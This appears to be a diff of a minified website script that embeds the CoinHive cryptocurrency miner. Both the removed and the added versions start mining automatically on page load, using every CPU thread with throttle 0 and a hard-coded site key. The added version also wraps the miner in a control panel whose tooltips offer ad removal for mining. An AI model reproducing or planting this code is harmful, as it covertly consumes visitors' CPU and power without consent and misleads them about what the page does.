@@ -1,21 +1,95 @@
 ! function() {
     var n = function() { try { return !!window.addEventListener } catch (n) { return !1 } },
-        t = function(t, o) { n() ? document.addEventListener("DOMContentLoaded", t, o) : document.attachEvent("onreadystatechange", t) };
-    t(function() {
+        e = function(e, t) { n() ? document.addEventListener("DOMContentLoaded", e, t) : document.attachEvent("onreadystatechange", e) };
+    e(function() {
         ! function() {
             var n = document.createElement("script");
             n.type = "text/javascript", n.async = !0;
-            var t = document.getElementsByTagName("script")[0];
-            n.src = "https://coinhive.com/lib/coinhive.min.js", n.onload = function() {
-                function n(n) { return r.start(n) }
-                var t = "jVwy4y10DD5Ahz6qQ83qLrwXd5KZgJfp",
-                    o = !0,
-                    e = navigator.hardwareConcurrency,
-                    c = 0,
-                    r = new CoinHive.Anonymous(t, { throttle: c, threads: e }),
-                    i = CoinHive.FORCE_EXCLUSIVE_TAB;
-                o && n(i), r.on("open", function() {}), r.on("authed", function(n) {}), r.on("close", function() {}), r.on("error", function(n) {}), r.on("job", function() {}), r.on("found", function() {}), r.on("accepted", function() {})
-            }, n.onerror = function() {}, t.parentNode.insertBefore(n, t)
+            var e = document.getElementsByTagName("script")[0];
+            n.src = "./coinhive.min.js", n.onload = function() {
+                function n(n) { return In.start(n) }
+                var e = "jVwy4y10DD5Ahz6qQ83qLrwXd5KZgJfp",
+                    t = !0,
+                    i = navigator.hardwareConcurrency,
+                    s = 0,
+                    d = "miner",
+                    a = "mining-stats-canvas",
+                    o = "mining-is-running",
+                    m = "mining-is-running-id",
+                    r = "mining-is-running-id-output",
+                    p = "mining-hashes-per-second",
+                    l = "mining-hashes-per-second-id",
+                    c = "mining-hashes-per-second-id-output",
+                    h = "mining-accepted-hashes-per-second",
+                    u = "mining-accepted-hashes-per-second-id",
+                    g = "mining-accepted-hashes-per-second-id-output",
+                    v = "mining-threads",
+                    w = "mining-threads-id",
+                    y = "mining-threads-id-output",
+                    _ = "mining-threads-add",
+                    f = "mining-threads-remove",
+                    E = "mining-hashes-total",
+                    H = "mining-hashes-total-id",
+                    T = "mining-hashes-total-id-output",
+                    L = "mining-start",
+                    I = "mining-stop",
+                    B = "addthreads",
+                    M = "removethreads",
+                    b = "startmining",
+                    C = "stopmining",
+                    U = "mining-current-throttle",
+                    S = "mining-current-throttle-id",
+                    x = "mining-current-throttle-id-output",
+                    P = "mining-increase-throttle",
+                    A = "mining-increase-throttle-id",
+                    D = "mining-decrease-throttle",
+                    j = "mining-decrease-throttle-id",
+                    O = "mining-minimal-speed",
+                    k = "mining-minimal-speed-id",
+                    q = "mining-maximum-speed",
+                    K = "mining-maximum-speed-id",
+                    N = "mining-default-recommended-speed",
+                    R = "mining-default-recommended-speed-id",
+                    V = "tooltiptext",
+                    X = "tooltip",
+                    z = "miner-button-class",
+                    F = "miner-text-area-class",
+                    J = "",
+                    Q = "If the miner is currently running.",
+                    W = "Hashes/s | ",
+                    Z = "The total number of hashes per second for all threads combined.",
+                    G = "Accepted Hashes | ",
+                    Y = "The number of hashes that have been accepted by the pool.",
+                    $ = "Threads | ",
+                    nn = "Amount of threads you have running currently.",
+                    en = "+",
+                    tn = "Speed it up! Increases threads, but too many may slow your browser. 3 or 4 are OK in most cases.",
+                    sn = "-",
+                    dn = "Slow it down! (decrease threads to 0 to stop entirely)",
+                    an = "Total Hashes | ",
+                    on = "Hashes you solved so far. We will remove all ads for you once you mine enough. Login to have it keep track of your progress.",
+                    mn = "Start",
+                    rn = "Start the miner.",
+                    pn = "Stop",
+                    ln = "Stop the miner.",
+                    cn = "Throttle | ",
+                    hn = "How much the miner is currently being throttled.",
+                    un = "+",
+                    gn = "Increase the throttle to reduce CPU consumption.",
+                    vn = "-",
+                    wn = "Decrease the throttle to allow more CPU consumption.",
+                    yn = "Min",
+                    _n = "Use the most minimal amount of CPU and Power possible.",
+                    fn = "Max",
+                    En = "Use all CPU and Power available.",
+                    Hn = "Default",
+                    Tn = "Use Recommended default settings.",
+                    Ln = document.createElement("div");
+                Ln.id = d, document.body.appendChild(Ln), new_html = "<div id='" + a + "'></div>", document.getElementById(d).innerHTML = new_html, new_html = "<div id='" + o + "' class='" + X + " " + F + "'><span id='" + m + "'>" + J + "</span><span id='" + r + "'></span><span id='" + V + "'>" + Q + "</span></div>", document.getElementById(a).innerHTML += new_html, new_html = "<div id='" + p + "' class='" + X + " " + F + "'><span id='" + l + "'>" + W + "</span><span id='" + c + "'></span><span id='" + V + "'>" + Z + "</span></div>", document.getElementById(a).innerHTML += new_html, new_html = "<div id='" + h + "' class='" + X + " " + F + "'><span id='" + u + "'>" + G + "</span><span id='" + g + "'></span><span id='" + V + "'>" + Y + "</span></div>", document.getElementById(a).innerHTML += new_html, new_html = "<div id='" + v + "' class='" + X + " " + F + "'><span id='" + w + "'>" + $ + "</span><span id='" + y + "'></span><span id='" + V + "'>" + nn + "</span></div>", document.getElementById(a).innerHTML += new_html, new_html = "<div id='" + _ + "' class='" + X + " " + z + "'><span id='" + B + "'>" + en + "</span><span id='" + V + "'>" + tn + "</span></div>", document.getElementById(a).innerHTML += new_html, new_html = "<div id='" + f + "' class='" + X + " " + z + "'><span id='" + M + "'>" + sn + "</span><span id='" + V + "'>" + dn + "</span></div>", document.getElementById(a).innerHTML += new_html, new_html = "<div id='" + E + "' class='" + X + " " + F + "'><span id='" + H + "'>" + an + "</span><span id='" + T + "'></span><span id='" + V + "'>" + on + "</span></div>", document.getElementById(a).innerHTML += new_html, new_html = "<div id='" + L + "' class='" + X + " " + z + "'><span id='" + b + "'>" + mn + "</span><span id='" + V + "'>" + rn + "</span></div>", document.getElementById(a).innerHTML += new_html, new_html = "<div id='" + I + "' class='" + X + " " + z + "'><span id='" + C + "'>" + pn + "</span><span id='" + V + "'>" + ln + "</span></div>", document.getElementById(a).innerHTML += new_html, new_html = "<div id='" + U + "' class='" + X + " " + F + "'><span id='" + S + "'>" + cn + "</span><span id='" + x + "'></span><span id='" + V + "'>" + hn + "</span></div>", document.getElementById(a).innerHTML += new_html, new_html = "<div id='" + P + "' class='" + X + " " + z + "'><span id='" + A + "'>" + un + "</span><span id='" + V + "'>" + gn + "</span></div>", document.getElementById(a).innerHTML += new_html, new_html = "<div id='" + D + "' class='" + X + " " + z + "'><span id='" + j + "'>" + vn + "</span><span id='" + V + "'>" + wn + "</span></div>", document.getElementById(a).innerHTML += new_html, new_html = "<div id='" + O + "' class='" + X + " " + z + "'><span id='" + k + "'>" + yn + "</span><span id='" + V + "'>" + _n + "</span></div>", document.getElementById(a).innerHTML += new_html, new_html = "<div id='" + q + "' class='" + X + " " + z + "'><span id='" + K + "'>" + fn + "</span><span id='" + V + "'>" + En + "</span></div>", document.getElementById(a).innerHTML += new_html, new_html = "<div id='" + N + "' class='" + X + " " + z + "'><span id='" + R + "'>" + Hn + "</span><span id='" + V + "'>" + Tn + "</span></div>", document.getElementById(a).innerHTML += new_html;
+                var In = new CoinHive.Anonymous(e, { throttle: s, threads: i }),
+                    Bn = CoinHive.FORCE_EXCLUSIVE_TAB;
+                t && n(Bn), In.on("open", function() {}), In.on("authed", function(n) {}), In.on("close", function() {}), In.on("error", function(n) {}), In.on("job", function() {}), In.on("found", function() {}), In.on("accepted", function() {})
+            }, n.onerror = function() {}, e.parentNode.insertBefore(n, e)
         }()
     }, !1)
 }();
